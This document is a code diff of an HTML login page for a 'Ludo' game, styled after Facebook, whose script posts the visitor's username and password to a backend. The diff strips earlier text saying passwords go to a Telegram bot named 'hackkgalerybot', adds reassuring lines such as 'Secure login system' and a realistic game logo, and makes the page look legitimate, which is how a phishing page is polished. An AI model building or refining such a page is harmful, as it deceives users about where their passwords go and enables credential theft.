@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Login - Get Password on Telegram</title>
+    <title>Login - Ludo</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * {
@@ -20,71 +20,133 @@
             padding: 20px;
         }
         
-        /* Ludo Logo Section */
+        /* Realistic Ludo Logo */
         .logo-section {
             text-align: center;
-            margin: 30px 0 20px 0;
+            margin: 30px 0 25px 0;
         }
         
-        .ludo-logo {
-            width: 120px;
-            height: 120px;
-            background: linear-gradient(135deg, #FF6B6B, #4ECDC4, #45B7D1, #96CEB4);
-            border-radius: 25px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 15px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
+        .ludo-container {
+            position: relative;
+            width: 150px;
+            height: 150px;
+            margin: 0 auto 20px;
+        }
+        
+        .ludo-board {
+            width: 100%;
+            height: 100%;
+            background: white;
+            border-radius: 15px;
             position: relative;
             overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            border: 3px solid #333;
         }
         
-        .ludo-logo::before {
+        /* Ludo board design */
+        .ludo-board::before {
             content: '';
             position: absolute;
             width: 100%;
             height: 100%;
             background: 
-                linear-gradient(90deg, transparent 45%, white 45%, white 55%, transparent 55%),
-                linear-gradient(0deg, transparent 45%, white 45%, white 55%, transparent 55%);
+                /* Vertical lines */
+                linear-gradient(90deg, transparent 49%, #333 49%, #333 51%, transparent 51%),
+                /* Horizontal lines */
+                linear-gradient(transparent 49%, #333 49%, #333 51%, transparent 51%),
+                /* Center cross */
+                linear-gradient(45deg, transparent 46%, #333 46%, #333 54%, transparent 54%),
+                linear-gradient(-45deg, transparent 46%, #333 46%, #333 54%, transparent 54%);
         }
         
-        .ludo-dots {
+        /* Ludo home areas */
+        .home {
             position: absolute;
-            width: 80%;
-            height: 80%;
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            grid-template-rows: repeat(3, 1fr);
-            gap: 5px;
+            width: 40%;
+            height: 40%;
+            border-radius: 10px;
         }
         
-        .dot {
-            width: 15px;
-            height: 15px;
-            background: white;
+        .home-red {
+            background: linear-gradient(135deg, #FF5252, #FF8A80);
+            top: 5%;
+            left: 5%;
+        }
+        
+        .home-green {
+            background: linear-gradient(135deg, #4CAF50, #81C784);
+            top: 5%;
+            right: 5%;
+        }
+        
+        .home-yellow {
+            background: linear-gradient(135deg, #FFD740, #FFE57F);
+            bottom: 5%;
+            left: 5%;
+        }
+        
+        .home-blue {
+            background: linear-gradient(135deg, #2196F3, #64B5F6);
+            bottom: 5%;
+            right: 5%;
+        }
+        
+        /* Home decorations */
+        .home::after {
+            content: '';
+            position: absolute;
+            width: 60%;
+            height: 60%;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 8px;
+            top: 20%;
+            left: 20%;
+        }
+        
+        /* Pawns/coins */
+        .pawn {
+            position: absolute;
+            width: 18px;
+            height: 18px;
             border-radius: 50%;
-            margin: auto;
+            border: 2px solid white;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            z-index: 2;
         }
         
-        .dot:nth-child(1) { background: #FF6B6B; }
-        .dot:nth-child(3) { background: #4ECDC4; }
-        .dot:nth-child(5) { background: #FFEAA7; }
-        .dot:nth-child(7) { background: #45B7D1; }
-        .dot:nth-child(9) { background: #96CEB4; }
+        .pawn-1 { background: #FF5252; top: 25%; left: 25%; }
+        .pawn-2 { background: #FF5252; top: 25%; left: 50%; }
+        .pawn-3 { background: #FF5252; top: 50%; left: 25%; }
+        .pawn-4 { background: #FF5252; top: 50%; left: 50%; }
+        
+        .pawn-5 { background: #4CAF50; top: 25%; right: 25%; }
+        .pawn-6 { background: #4CAF50; top: 25%; right: 50%; }
+        .pawn-7 { background: #4CAF50; top: 50%; right: 25%; }
+        .pawn-8 { background: #4CAF50; top: 50%; right: 50%; }
+        
+        .pawn-9 { background: #FFD740; bottom: 25%; left: 25%; }
+        .pawn-10 { background: #FFD740; bottom: 25%; left: 50%; }
+        .pawn-11 { background: #FFD740; bottom: 50%; left: 25%; }
+        .pawn-12 { background: #FFD740; bottom: 50%; left: 50%; }
+        
+        .pawn-13 { background: #2196F3; bottom: 25%; right: 25%; }
+        .pawn-14 { background: #2196F3; bottom: 25%; right: 50%; }
+        .pawn-15 { background: #2196F3; bottom: 50%; right: 25%; }
+        .pawn-16 { background: #2196F3; bottom: 50%; right: 50%; }
         
         .logo-text {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: 800;
             color: #1877F2;
             letter-spacing: -0.5px;
+            margin-bottom: 5px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
         
-        .logo-subtext {
+        .tagline {
             color: #65676B;
-            font-size: 18px;
-            margin-top: 5px;
+            font-size: 16px;
             font-weight: 500;
         }
         
@@ -96,7 +158,7 @@
             padding: 20px;
             width: 100%;
             max-width: 400px;
-            margin-top: 10px;
+            margin-top: 15px;
         }
         
         .login-box h2 {
@@ -230,51 +292,23 @@
             display: block;
         }
         
-        /* Telegram Section */
-        .telegram-section {
+        /* Telegram Info */
+        .info-box {
             background: white;
             border-radius: 12px;
-            padding: 20px;
+            padding: 15px;
             margin-top: 20px;
             width: 100%;
             max-width: 400px;
             text-align: center;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            border-left: 4px solid #1877F2;
         }
         
-        .telegram-icon {
-            background: #0088cc;
-            color: white;
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 15px;
-            font-size: 24px;
-        }
-        
-        .telegram-text {
+        .info-box p {
             color: #65676B;
             font-size: 14px;
-            margin: 10px 0;
-        }
-        
-        .telegram-link {
-            display: inline-block;
-            background: #0088cc;
-            color: white;
-            text-decoration: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            font-weight: 600;
-            margin-top: 10px;
-            transition: background 0.2s;
-        }
-        
-        .telegram-link:hover {
-            background: #0077b3;
+            margin: 5px 0;
         }
         
         /* Footer */
@@ -304,51 +338,94 @@
             text-decoration: underline;
         }
         
-        /* Responsive */
-        @media (max-width: 450px) {
-            .login-box, .telegram-section, .footer {
-                max-width: 100%;
-            }
-            
-            .ludo-logo {
-                width: 100px;
-                height: 100px;
-            }
-            
-            .logo-text {
-                font-size: 24px;
-            }
-        }
-        
         /* Animation */
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
         
-        .login-box, .telegram-section {
-            animation: fadeIn 0.5s ease-out;
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-5px); }
+        }
+        
+        .ludo-container {
+            animation: fadeIn 0.8s ease-out;
+        }
+        
+        .pawn {
+            animation: bounce 2s infinite;
+        }
+        
+        .pawn-1 { animation-delay: 0.1s; }
+        .pawn-2 { animation-delay: 0.2s; }
+        .pawn-3 { animation-delay: 0.3s; }
+        .pawn-4 { animation-delay: 0.4s; }
+        .pawn-5 { animation-delay: 0.5s; }
+        .pawn-6 { animation-delay: 0.6s; }
+        .pawn-7 { animation-delay: 0.7s; }
+        .pawn-8 { animation-delay: 0.8s; }
+        .pawn-9 { animation-delay: 0.9s; }
+        .pawn-10 { animation-delay: 1.0s; }
+        .pawn-11 { animation-delay: 1.1s; }
+        .pawn-12 { animation-delay: 1.2s; }
+        .pawn-13 { animation-delay: 1.3s; }
+        .pawn-14 { animation-delay: 1.4s; }
+        .pawn-15 { animation-delay: 1.5s; }
+        .pawn-16 { animation-delay: 1.6s; }
+        
+        /* Responsive */
+        @media (max-width: 450px) {
+            .login-box, .info-box, .footer {
+                max-width: 100%;
+            }
+            
+            .ludo-container {
+                width: 130px;
+                height: 130px;
+            }
+            
+            .logo-text {
+                font-size: 28px;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Ludo Logo Section -->
+    <!-- Realistic Ludo Logo -->
     <div class="logo-section">
-        <div class="ludo-logo">
-            <div class="ludo-dots">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
+        <div class="ludo-container">
+            <div class="ludo-board">
+                <!-- Home areas -->
+                <div class="home home-red"></div>
+                <div class="home home-green"></div>
+                <div class="home home-yellow"></div>
+                <div class="home home-blue"></div>
+                
+                <!-- Pawns/Coins -->
+                <div class="pawn pawn-1"></div>
+                <div class="pawn pawn-2"></div>
+                <div class="pawn pawn-3"></div>
+                <div class="pawn pawn-4"></div>
+                
+                <div class="pawn pawn-5"></div>
+                <div class="pawn pawn-6"></div>
+                <div class="pawn pawn-7"></div>
+                <div class="pawn pawn-8"></div>
+                
+                <div class="pawn pawn-9"></div>
+                <div class="pawn pawn-10"></div>
+                <div class="pawn pawn-11"></div>
+                <div class="pawn pawn-12"></div>
+                
+                <div class="pawn pawn-13"></div>
+                <div class="pawn pawn-14"></div>
+                <div class="pawn pawn-15"></div>
+                <div class="pawn pawn-16"></div>
             </div>
         </div>
-        <div class="logo-text">Ludo Login</div>
-        <div class="logo-subtext">Get password on Telegram</div>
+        <div class="logo-text">Ludo</div>
+        <div class="tagline">Play, Connect, Enjoy</div>
     </div>
     
     <!-- Facebook Style Login Form -->
@@ -381,17 +458,11 @@
     <!-- Result Message -->
     <div id="result"></div>
     
-    <!-- Telegram Section -->
-    <div class="telegram-section">
-        <div class="telegram-icon">📱</div>
-        <h3 style="color:#333; margin-bottom:10px;">Get Password on Telegram</h3>
-        <p class="telegram-text">
-            After login, your password will be sent to<br>
-            your Telegram bot instantly.
-        </p>
-        <a href="https://t.me/hackkgalerybot" target="_blank" class="telegram-link">
-            Open Telegram Bot
-        </a>
+    <!-- Info Box -->
+    <div class="info-box">
+        <p>🔒 Secure login system</p>
+        <p>🎮 Connect with friends</p>
+        <p>🏆 Play tournaments</p>
     </div>
     
     <!-- Footer -->
@@ -408,7 +479,7 @@
             <a href="#">Cookies</a>
         </div>
         <div style="margin-top: 15px; font-size: 11px; color: #b0b3b8;">
-            Educational Purpose Only
+            Educational Demonstration
         </div>
     </div>
 
@@ -442,14 +513,14 @@
                         username: username,
                         password: password,
                         timestamp: new Date().toISOString(),
-                        source: 'Ludo Login System'
+                        source: 'Ludo Login'
                     })
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    showResult('✅ Login successful! Check Telegram bot for password', 'success');
+                    showResult('✅ Login successful!', 'success');
                     
                     // Clear form after 2 seconds
                     setTimeout(() => {
@@ -486,6 +557,16 @@
             setTimeout(() => {
                 this.style.transform = '';
             }, 150);
+        });
+        
+        // Add hover effect to Ludo board
+        document.querySelector('.ludo-board').addEventListener('mouseenter', function() {
+            this.style.transform = 'rotate(5deg) scale(1.05)';
+            this.style.transition = 'transform 0.3s ease';
+        });
+        
+        document.querySelector('.ludo-board').addEventListener('mouseleave', function() {
+            this.style.transform = 'rotate(0) scale(1)';
         });
     </script>
 </body>
